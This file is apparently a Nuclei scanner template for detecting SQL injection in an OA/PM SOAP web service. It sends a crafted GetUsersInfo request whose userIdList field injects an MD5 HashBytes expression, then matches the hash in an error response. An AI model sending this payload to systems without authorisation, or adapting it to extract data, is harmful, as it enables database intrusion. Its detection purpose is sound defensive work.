folder-9/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yaml

id: oa-sql-injection-ct-456760
info:
  name: OA SQL Injection Detection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects SQL injection vulnerability in the OA/PM web service endpoint.
variables:
  random: "{{rand_int(2000000, 4000000)}}"
http:
  - raw:
      - |
        POST /OA/PM/svc.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUsersInfo xmlns="http://tempuri.org/">
              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{random}}'),2))</userIdList>
            </GetUsersInfo>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: regex
        part: body
        regex:
          - "{{to_lower(md5(to_string(random)))}}"
